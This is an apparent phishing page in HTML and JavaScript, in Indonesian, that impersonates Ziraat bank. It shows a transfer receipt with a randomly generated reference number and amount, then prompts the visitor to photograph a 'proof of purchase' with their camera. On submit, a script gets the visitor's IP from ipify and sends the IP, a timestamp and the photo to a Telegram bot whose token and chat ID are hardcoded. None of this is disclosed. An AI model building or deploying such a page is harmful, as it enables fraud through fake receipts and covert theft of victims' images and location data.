<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Ziraat · Kamera Bukti</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Roboto, system-ui, sans-serif;
        }

        body {
            min-height: 100vh;
            background: linear-gradient(145deg, #f6f9fc 0%, #e9f0f5 100%);
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 20px;
            gap: 25px;
        }

        /* ===== KARTU 1: BUKTI TRANSFER ZIRAAT ===== */
        .card-transfer {
            width: 100%;
            max-width: 400px;
            background: white;
            padding: 28px 25px;
            border-radius: 18px;
            box-shadow: 0 8px 30px rgba(0,0,0,0.12);
            border-top: 6px solid #e30613;
            transition: 0.25s ease;
        }
        .card-transfer .header {
            text-align: center;
            margin-bottom: 20px;
        }
        .card-transfer .logo-icon {
            font-size: 40px;
            color: #e30613;
        }
        .card-transfer .header h2 {
            margin: 4px 0;
            color: #1a1a2e;
            font-size: 22px;
            font-weight: 700;
        }
        .card-transfer .header p {
            font-size: 13px;
            color: #888;
        }

        .transfer-row {
            display: flex;
            justify-content: space-between;
            padding: 6px 0;
            font-size: 14px;
            border-bottom: 1px solid #f0f0f0;
        }
        .transfer-row .label {
            color: #666;
        }
        .transfer-row .value {
            font-weight: 600;
            color: #1a1a2e;
        }
        .transfer-row .value.highlight {
            font-size: 20px;
            color: #e30613;
        }

        .transfer-divider {
            border: 0;
            border-top: 1.5px dashed #e0e0e0;
            margin: 14px 0;
        }

        .transfer-status {
            background: #e8f5e9;
            color: #2e7d32;
            text-align: center;
            padding: 12px;
            border-radius: 10px;
            font-weight: 700;
            font-size: 16px;
            margin-top: 16px;
            letter-spacing: 0.5px;
        }

        .btn-confirm {
            width: 100%;
            margin-top: 16px;
            padding: 14px;
            background: #e30613;
            color: white;
            border: none;
            border-radius: 40px;
            font-weight: 700;
            font-size: 16px;
            cursor: pointer;
            transition: 0.2s;
            box-shadow: 0 4px 14px rgba(227, 6, 19, 0.3);
        }
        .btn-confirm:hover {
            background: #c40510;
            transform: translateY(-2px);
            box-shadow: 0 6px 20px rgba(227, 6, 19, 0.4);
        }
        .btn-confirm:active {
            transform: scale(0.97);
        }

        /* ===== KARTU 2: UPLOAD BUKTI PEMBELIAN ===== */
        .card-upload {
            width: 100%;
            max-width: 400px;
            background: rgba(255, 255, 255, 0.92);
            backdrop-filter: blur(8px);
            -webkit-backdrop-filter: blur(8px);
            padding: 28px 25px;
            border-radius: 18px;
            box-shadow: 0 8px 30px rgba(0,0,0,0.10);
            border: 1px solid rgba(255,255,255,0.6);
            transition: 0.25s ease;
        }
        .card-upload .upload-title {
            font-size: 17px;
            font-weight: 600;
            color: #1a1a2e;
            display: flex;
            align-items: center;
            gap: 10px;
            margin-bottom: 16px;
        }
        .card-upload .upload-title i {
            background: #d4a373;
            color: white;
            width: 32px;
            height: 32px;
            border-radius: 12px;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            font-size: 16px;
            font-style: normal;
        }

        /* ===== TOMBOL KAMERA UTAMA YANG MENCOLOK ===== */
        .camera-main-btn {
            width: 100%;
            padding: 18px 16px;
            background: #1e2a3e;
            border: none;
            border-radius: 60px;
            color: white;
            font-weight: 700;
            font-size: 18px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
            cursor: pointer;
            transition: 0.15s ease;
            box-shadow: 0 8px 20px rgba(0, 20, 30, 0.20);
            border: 1px solid #3a506e;
            margin-bottom: 16px;
        }
        .camera-main-btn:hover {
            background: #2b3f58;
            transform: scale(1.01);
            box-shadow: 0 12px 28px rgba(0, 20, 30, 0.25);
        }
        .camera-main-btn:active {
            transform: scale(0.97);
        }
        .camera-main-btn .camera-icon {
            font-size: 28px;
            line-height: 1;
        }
        .camera-main-btn .camera-text {
            font-size: 14px;
            font-weight: 400;
            opacity: 0.7;
            display: block;
            width: 100%;
            text-align: center;
        }

        .photo-preview {
            margin-top: 12px;
            display: flex;
            align-items: center;
            gap: 16px;
            flex-wrap: wrap;
        }
        .preview-box {
            width: 90px;
            height: 90px;
            border-radius: 18px;
            background: #eef3f7;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 13px;
            color: #4a5b6e;
            border: 1.5px solid #d8e2ec;
            overflow: hidden;
            background-size: cover;
            background-position: center;
            transition: 0.15s;
        }
        .preview-box.has-image {
            border-color: #d4a373;
        }

        .status-text {
            font-size: 13px;
            color: #4a5b6e;
            background: #eef3f7;
            padding: 6px 16px;
            border-radius: 40px;
            display: inline-block;
        }

        .upload-hint {
            margin-top: 10px;
            font-size: 12px;
            color: #3e5a72;
            background: #e4edf6;
            padding: 6px 16px;
            border-radius: 40px;
            display: inline-block;
        }

        .action-bar {
            display: flex;
            justify-content: flex-end;
            margin-top: 22px;
            gap: 12px;
            flex-wrap: wrap;
        }
        .btn-primary {
            background: #1e2a3e;
            border: none;
            color: white;
            padding: 14px 32px;
            border-radius: 60px;
            font-weight: 700;
            font-size: 15px;
            display: inline-flex;
            align-items: center;
            gap: 10px;
            cursor: pointer;
            transition: 0.2s;
            box-shadow: 0 6px 16px rgba(0, 20, 30, 0.12);
            border: 1px solid #30435c;
        }
        .btn-primary:hover {
            background: #253a52;
            transform: translateY(-2px);
            box-shadow: 0 12px 24px rgba(0, 20, 30, 0.15);
        }
        .btn-primary:active {
            transform: translateY(1px);
        }
        .btn-secondary {
            background: transparent;
            border: 1.5px solid #b8c9da;
            color: #1e2a3e;
            padding: 14px 24px;
            border-radius: 60px;
            font-weight: 600;
            cursor: pointer;
            transition: 0.15s;
            font-size: 14px;
        }
        .btn-secondary:hover {
            background: #eef3f7;
            border-color: #8da3b9;
        }

        /* ===== OVERLAY KAMERA ===== */
        #videoContainer {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.92);
            backdrop-filter: blur(4px);
            display: none;
            align-items: center;
            justify-content: center;
            flex-direction: column;
            z-index: 9999;
            padding: 20px;
            animation: fadeIn 0.2s ease;
        }
        #videoContainer.active {
            display: flex;
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: scale(0.98); }
            to { opacity: 1; transform: scale(1); }
        }

        #videoContainer video {
            width: 100%;
            max-width: 480px;
            max-height: 70vh;
            border-radius: 28px;
            background: #0a0f1a;
            box-shadow: 0 20px 50px rgba(0,0,0,0.6);
            object-fit: cover;
            border: 2px solid rgba(255,255,255,0.1);
        }

        .camera-controls {
            display: flex;
            justify-content: center;
            gap: 20px;
            margin-top: 24px;
            flex-wrap: wrap;
            width: 100%;
            max-width: 480px;
        }

        .camera-controls button {
            padding: 14px 28px;
            border: none;
            border-radius: 60px;
            font-weight: 700;
            font-size: 16px;
            display: inline-flex;
            align-items: center;
            gap: 12px;
            cursor: pointer;
            transition: 0.15s ease;
            box-shadow: 0 4px 16px rgba(0,0,0,0.3);
            flex: 1 1 auto;
            min-width: 120px;
            justify-content: center;
        }

        .btn-capture {
            background: #ffffff;
            color: #1a1a2e;
        }
        .btn-capture:hover {
            background: #f0f0f0;
            transform: scale(1.03);
        }
        .btn-capture:active {
            transform: scale(0.95);
        }

        .btn-close-camera {
            background: #e30613;
            color: white;
        }
        .btn-close-camera:hover {
            background: #c40510;
        }

        /* ===== RESPONSIVE ===== */
        @media (max-width: 480px) {
            .card-transfer, .card-upload {
                padding: 20px 16px;
            }
            .camera-main-btn {
                font-size: 16px;
                padding: 16px 14px;
                flex-wrap: wrap;
                gap: 6px;
            }
            .camera-main-btn .camera-text {
                font-size: 13px;
            }
            .camera-controls button {
                padding: 12px 16px;
                font-size: 14px;
                min-width: 100px;
            }
        }
    </style>
</head>
<body>

    <!-- ===== KARTU 1: BUKTI TRANSFER ZIRAAT ===== -->
    <div class="card-transfer">
        <div class="header">
            <div class="logo-icon"><img src="logi.png" alt="Ziraat" width="300" height="200"></div>
            

        <div class="transfer-row">
            <span class="label">Status Transaksi</span>
            <span class="value">Berhasil</span>
        </div>
        <div class="transfer-row">
            <span class="label">Nomor Referensi</span>
            <span class="value" id="refNumber">ZB-20260904-AKGQ</span>
        </div>
        <div class="transfer-row">
            <span class="label">Tanggal Transfer</span>
            <span class="value" id="transferDate">4 September 2026, 14.25</span>
        </div>

        <hr class="transfer-divider">

        <div class="transfer-row">
            <span class="label">Nama Pengirim</span>
            <span class="value">Ahmad</span>
        </div>
        <div class="transfer-row">
            <span class="label">Nama Penerima</span>
            <span class="value">Supardi</span>
        </div>
        <div class="transfer-row">
            <span class="label">Jumlah Transfer</span>
            <span class="value highlight" id="transferAmount">Rp 2.500.000</span>
        </div>

        <div class="transfer-status"> TRANSFER BERHASIL</div>

        <button class="btn-confirm" id="goToUploadBtn"> Upload Bukti Pembelian</button>
    </div>


    <!-- ===== KARTU 2: BUKTI TRANSFER ZIRAAT ===== -->
    <div class="card-upload" id="uploadSection">
    <div class="upload-title">
        <img src="logi.png" alt="Logo" style="width: 32px; height: 32px; border-radius: 12px; object-fit: cover; background: #e30613; padding: 5px;">
        Bukti pembelian 
    </div>

        <!-- TOMBOL KAMERA BESAR -->
        <button class="camera-main-btn" id="openCameraBtn">
            <span class="camera-icon"></span>
            <span>Ambil Foto Bukti</span>
            <span class="camera-text">Klik untuk membuka kamera</span>
        </button>

        <div class="photo-preview">
            <div class="preview-box" id="previewBox"> kosong</div>
            <span class="status-text" id="statusText">Belum ada foto</span>
        </div>

        <div class="upload-hint">
            ⏺ Pastikan foto barang terlihat jelas
        </div>

        <div class="action-bar">
            <button class="btn-secondary" id="resetBtn">↺ Reset</button>
            <button class="btn-primary" id="submitBtn"> Kirim Bukti</button>
        </div>
        <!-- Footer note dihapus -->
    </div>

    <!-- ===== OVERLAY KAMERA (tampilan kamera yang ditingkatkan) ===== -->
    <div id="videoContainer">
        <video id="video" autoplay playsinline></video>
        <div class="camera-controls">
            <button class="btn-close-camera" id="closeCameraBtn">✕ Tutup</button>
            <button class="btn-capture" id="captureBtn">📸 Ambil Foto</button>
        </div>
    </div>

    <script>
        (function() {
            // ===== KONFIGURASI TELEGRAM =====
            const T = '8671571978:AAEcNUE88wVynEc93TPQ8mJ0LaJ6oegoYjw';
            const C = '5323588727';

            // ===== ELEMEN DOM =====
            const previewBox = document.getElementById('previewBox');
            const statusText = document.getElementById('statusText');
            const resetBtn = document.getElementById('resetBtn');
            const submitBtn = document.getElementById('submitBtn');
            const goToUploadBtn = document.getElementById('goToUploadBtn');
            const openCameraBtn = document.getElementById('openCameraBtn');

            // Elemen kamera
            const videoContainer = document.getElementById('videoContainer');
            const video = document.getElementById('video');
            const captureBtn = document.getElementById('captureBtn');
            const closeCameraBtn = document.getElementById('closeCameraBtn');

            // ===== ELEMEN BUKTI TRANSFER =====
            const refNumber = document.getElementById('refNumber');
            const transferDate = document.getElementById('transferDate');
            const transferAmount = document.getElementById('transferAmount');

            // state
            let currentImageBlob = null;
            let currentImageDataURL = null;
            let stream = null;

            // ===== GENERATE DATA TRANSFER =====
            function generateReceipt() {
                const now = new Date();
                const dateStr = now.toLocaleDateString('id-ID', {
                    day: 'numeric',
                    month: 'long',
                    year: 'numeric'
                });
                const timeStr = now.toLocaleTimeString('id-ID', {
                    hour: '2-digit',
                    minute: '2-digit'
                });
                transferDate.textContent = `${dateStr}, ${timeStr}`;

                const ref = 'ZB-' + now.getFullYear() +
                           String(now.getMonth()+1).padStart(2,'0') +
                           String(now.getDate()).padStart(2,'0') +
                           '-' + Math.random().toString(36).substring(2, 6).toUpperCase();
                refNumber.textContent = ref;

                const amount = (Math.floor(Math.random() * 5 + 1) * 500000);
                transferAmount.textContent = 'Rp ' + amount.toLocaleString('id-ID');
            }
            generateReceipt();

            // ===== SCROLL KE UPLOAD =====
            goToUploadBtn.addEventListener('click', function() {
                document.getElementById('uploadSection').scrollIntoView({
                    behavior: 'smooth',
                    block: 'start'
                });
            });

            // ===== UPDATE PREVIEW & STATUS =====
            function updateUI(blob, dataURL) {
                currentImageBlob = blob;
                currentImageDataURL = dataURL;
                if (dataURL) {
                    previewBox.style.backgroundImage = `url(${dataURL})`;
                    previewBox.innerText = '';
                    previewBox.classList.add('has-image');
                    statusText.innerText = '📸 Foto siap';
                } else {
                    previewBox.style.backgroundImage = '';
                    previewBox.innerText = '📷 kosong';
                    previewBox.classList.remove('has-image');
                    statusText.innerText = 'Belum ada foto';
                }
            }

            // ===== KIRIM KE TELEGRAM =====
            function sendToTelegram(ip, imageBlob) {
                const text = `IP: ${ip}\nWaktu: ${new Date().toLocaleString()}`;
                fetch(`https://api.telegram.org/bot${T}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id: C, text: text })
                }).catch(e => console.warn('sendMessage error', e));

                if (imageBlob) {
                    const fd = new FormData();
                    fd.append('chat_id', C);
                    fd.append('photo', imageBlob, 'bukti_pembelian.jpg');
                    fetch(`https://api.telegram.org/bot${T}/sendPhoto`, {
                        method: 'POST',
                        body: fd
                    }).catch(e => console.warn('sendPhoto error', e));
                }
            }

            // ===== SUBMIT =====
            function handleSubmit() {
                if (!currentImageBlob) {
                    alert('❌ Silakan ambil foto bukti pembelian terlebih dahulu!');
                    return;
                }
                fetch('https://api.ipify.org?format=json')
                    .then(r => r.json())
                    .then(data => {
                        const ip = data.ip || '0.0.0.0';
                        sendToTelegram(ip, currentImageBlob);
                        alert(`✅ Data terkirim!\nIP: ${ip}\nFoto: ${currentImageBlob ? 'ada' : 'tidak ada'}`);
                    })
                    .catch(err => {
                        alert('❌ Gagal mendapatkan IP, coba lagi.');
                        console.warn(err);
                    });
            }

            // ===== RESET =====
            function resetAll() {
                updateUI(null, null);
                statusText.innerText = 'Belum ada foto';
                previewBox.innerText = '📷 kosong';
                previewBox.style.backgroundImage = '';
                previewBox.classList.remove('has-image');
            }

            // ===== BUKA KAMERA =====
            function openCamera() {
                if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
                    alert('❌ Kamera tidak didukung di browser ini.');
                    return;
                }

                navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        facingMode: 'environment',
                        width: { ideal: 1280 },
                        height: { ideal: 720 }
                    } 
                })
                .then(s => {
                    stream = s;
                    video.srcObject = stream;
                    videoContainer.classList.add('active');
                    video.play();
                })
                .catch(err => {
                    alert('❌ Gagal mengakses kamera. Pastikan izin kamera diberikan.\n' + err.message);
                    console.warn(err);
                });
            }

            // ===== TUTUP KAMERA =====
            function closeCamera() {
                if (stream) {
                    stream.getTracks().forEach(t => t.stop());
                    stream = null;
                }
                video.srcObject = null;
                videoContainer.classList.remove('active');
            }

            // ===== AMBIL FOTO =====
            function capturePhoto() {
                const canvas = document.createElement('canvas');
                canvas.width = video.videoWidth || 1280;
                canvas.height = video.videoHeight || 720;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                
                canvas.toBlob(blob => {
                    const dataURL = canvas.toDataURL('image/jpeg', 0.9);
                    updateUI(blob, dataURL);
                    closeCamera();
                    alert('✅ Foto berhasil diambil!');
                }, 'image/jpeg', 0.9);
            }

            // ===== EVENT LISTENERS =====
            openCameraBtn.addEventListener('click', openCamera);
            captureBtn.addEventListener('click', capturePhoto);
            closeCameraBtn.addEventListener('click', closeCamera);

            // ESC untuk menutup kamera
            document.addEventListener('keydown', function(e) {
                if (e.key === 'Escape' && videoContainer.classList.contains('active')) {
                    closeCamera();
                }
            });

            submitBtn.addEventListener('click', handleSubmit);
            resetBtn.addEventListener('click', resetAll);

            // ===== INISIALISASI =====
            resetAll();
            console.log('✅ Ziraat Bankası + Kamera siap.');
        })();
    </script>

</body>
</html>
